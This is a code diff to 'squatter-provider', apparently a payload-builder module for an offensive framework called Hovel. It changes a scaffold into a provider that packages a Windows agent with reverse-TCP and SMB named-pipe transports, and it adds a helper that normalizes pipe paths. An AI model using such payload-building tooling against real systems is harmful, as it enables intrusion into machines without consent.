@@ -1,7 +1,7 @@
 // Command squatter-provider is the Hovel payload_provider module for Squatter.
 //
-// This scaffold exposes the provider RPC shape and placeholder metadata without
-// implementing a real listener, SMB named-pipe transport, or Windows agent.
+// The provider exposes Squatter payload metadata and packages the Windows agent
+// binary built from payloads/squatter/windows/src.
 package main
 
 import (
@@ -25,7 +25,7 @@ const (
 	payloadName  = "squatter"
 	platform     = "windows"
 	arch         = "x86"
-	minOS        = "windows-xp-sp3"
+	minOS        = "windows-7"
 	formatPEEXE  = "pe-exe"
 	reverseTCP   = "reverse-tcp"
 	smbNamedPipe = "smb-named-pipe"
@@ -65,7 +65,7 @@ func (Provider) Info() hovel.Info {
 		Version:     version,
 		Type:        hovel.TypePayloadProvider,
 		Summary:     "Build Squatter Windows payload artifacts.",
-		Description: "Core Hovel payload provider scaffold for Squatter.",
+		Description: "Core Hovel payload provider for Squatter.",
 		Tags:        []string{"payload_provider", "squatter", "windows", "lab", "dangerous"},
 	}
 }
@@ -209,13 +209,7 @@ func patchReverseTCPConfig(config []byte, req hovel.GeneratePayloadRequest) erro
 }
 
 func patchNamedPipeConfig(config []byte, req hovel.GeneratePayloadRequest) error {
-	pipe := req.Config["payload.pipe"]
-	if pipe == "" {
-		pipe = `\\.\pipe\squatter`
-	}
-	if !strings.HasPrefix(pipe, `\\`) {
-		pipe = `\\.\pipe\` + pipe
-	}
+	pipe := normalizeNamedPipe(req.Config["payload.pipe"])
 
 	encoded := utf16.Encode([]rune(pipe))
 	if len(encoded) >= payloadConfigPipeCharacters {
@@ -234,6 +228,23 @@ func patchNamedPipeConfig(config []byte, req hovel.GeneratePayloadRequest) error
 		)
 	}
 	return nil
+}
+
+func normalizeNamedPipe(pipe string) string {
+	if pipe == "" {
+		return `\\.\pipe\squatter`
+	}
+	if strings.HasPrefix(pipe, `\\.\pipe\`) {
+		return pipe
+	}
+	if strings.HasPrefix(pipe, `\\`) {
+		parts := strings.Split(pipe, `\`)
+		if len(parts) >= 5 && strings.EqualFold(parts[3], "pipe") && parts[4] != "" {
+			return `\\.\pipe\` + strings.Join(parts[4:], `\`)
+		}
+	}
+	pipe = strings.TrimLeft(pipe, `\`)
+	return `\\.\pipe\` + pipe
 }
 
 func loadPayloadBinary() ([]byte, error) {
